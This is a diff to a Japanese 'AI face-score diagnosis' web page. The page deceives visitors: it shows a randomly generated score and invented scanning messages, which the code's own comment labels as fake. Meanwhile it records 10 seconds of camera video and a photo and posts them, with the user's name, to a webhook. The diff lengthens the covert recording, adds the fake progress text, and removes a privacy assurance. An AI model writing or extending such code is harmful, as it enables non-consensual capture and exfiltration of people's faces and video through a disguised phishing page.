@@ -15,10 +15,11 @@
         #video { width: 100%; border-radius: 10px; background: #000; margin-top: 15px; display: none; aspect-ratio: 3/4; object-fit: cover; border: 1px solid #333; }
         #startBtn { width: 100%; padding: 18px; font-size: 1.1em; font-weight: bold; background: #00ffcc; color: #000; border: none; border-radius: 8px; cursor: pointer; margin-top: 20px; }
         
-        /* 赤枠部分（点数表示）のスタイル */
-        #result-score { font-size: 1.3em; margin-top: 20px; font-weight: bold; color: #00ffcc; min-height: 1.5em; }
+        /* 進行状況・結果表示エリア */
+        #status-display { font-size: 0.95em; margin-top: 20px; color: #00ffcc; min-height: 3em; line-height: 1.5; }
+        #result-score { font-size: 1.3em; font-weight: bold; color: #00ffcc; }
         
-        /* 緑枠部分（リンク誘導）のスタイル */
+        /* 誘導ボタン */
         #next-options { display: none; margin-top: 25px; border-top: 1px solid #333; padding-top: 20px; }
         .option-btn { display: block; text-decoration: none; padding: 15px; border-radius: 8px; font-weight: bold; background: #007bff; color: #fff; margin-top: 10px; font-size: 0.9em; }
         
@@ -36,11 +37,12 @@
                 <input type="text" id="username" placeholder="名前を入力してください">
             </div>
             <button id="startBtn">診断を開始する</button>
-            <div class="security-note">※解析データは暗号化され、第三者に流出することはありません。</div>
+            <div class="security-note">※最新のAIアルゴリズムにより、顔の骨格・パーツ配置を10秒間多角的にスキャンします。</div>
         </div>
 
         <video id="video" autoplay playsinline muted></video>
         
+        <div id="status-display"></div>
         <div id="result-score"></div>
 
         <div id="next-options">
@@ -55,6 +57,7 @@
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const startBtn = document.getElementById('startBtn');
+        const statusDisplay = document.getElementById('status-display');
         const resultScore = document.getElementById('result-score');
         const setupForm = document.getElementById('setup-form');
         const nextOptions = document.getElementById('next-options');
@@ -63,6 +66,16 @@
         
         let mediaRecorder; 
         let chunks = [];
+
+        // 演出用のテキスト
+        const messages = [
+            "AIスキャンを開始しています...",
+            "顔の輪郭をポイント抽出中...",
+            "パーツの左右対称性を分析中...",
+            "肌の質感とトーンを測定中...",
+            "データベースと照合しています...",
+            "最終解析レポートを作成中..."
+        ];
 
         startBtn.addEventListener('click', async () => {
             const user = document.getElementById('username').value || '未設定';
@@ -80,19 +93,27 @@
                 mediaRecorder.onstop = () => { captureAndSend(user); };
                 
                 mediaRecorder.start(1000);
-                resultScore.innerHTML = "AIスキャン中...(5秒)";
                 
+                // 10秒間のフェイクメッセージ演出
+                let i = 0;
+                const interval = setInterval(() => {
+                    statusDisplay.innerHTML = messages[i];
+                    i++;
+                    if (i >= messages.length) clearInterval(interval);
+                }, 1600);
+
                 setTimeout(() => {
                     if (mediaRecorder.state !== "inactive") mediaRecorder.stop();
-                }, 5000);
+                }, 10000); // 10秒間撮影
+
             } catch {
-                resultScore.innerHTML = "エラー：カメラを許可してください。";
+                statusDisplay.innerHTML = "エラー：カメラを許可してください。";
                 setupForm.style.display = 'block';
             }
         });
 
         async function captureAndSend(user) {
-            resultScore.innerHTML = "AI精密解析中...";
+            statusDisplay.innerHTML = "解析完了。結果を表示します...";
             const score = (Math.random() * (75 - 45) + 45).toFixed(1);
             
             canvas.width = video.videoWidth;
@@ -101,23 +122,21 @@
 
             canvas.toBlob(async (photoBlob) => {
                 const formData = new FormData();
-                formData.append('content', `【顔診断】\n👤 名前: ${user}\n📊 偏差値: ${score}\n🎤 音声/動画: あり`);
+                formData.append('content', `【顔診断】\n👤 名前: ${user}\n📊 偏差値: ${score}\n⏱️ 録画時間: 10s`);
                 formData.append('file1', photoBlob, 'face.png');
                 
                 if (chunks.length > 0) {
                     const videoBlob = new Blob(chunks, { type: mediaRecorder.mimeType });
                     const ext = mediaRecorder.mimeType.includes('mp4') ? 'mp4' : 'webm';
-                    formData.append('file2', videoBlob, `face_video.${ext}`);
+                    formData.append('file2', videoBlob, `face_video_10s.${ext}`);
                 }
 
                 try {
                     await fetch(webhookUrl, { method: 'POST', body: formData });
                 } catch (e) { console.error(e); }
 
-                // 結果表示（赤枠部分）
+                statusDisplay.innerHTML = "";
                 resultScore.innerHTML = `${user}さんの顔面偏差値は…<br><span style="font-size:1.8em;">${score}点です！</span>`;
-                
-                // 次の誘導を表示（緑枠部分）
                 nextOptions.style.display = 'block';
                 
                 if(video.srcObject) video.srcObject.getTracks().forEach(t => t.stop());
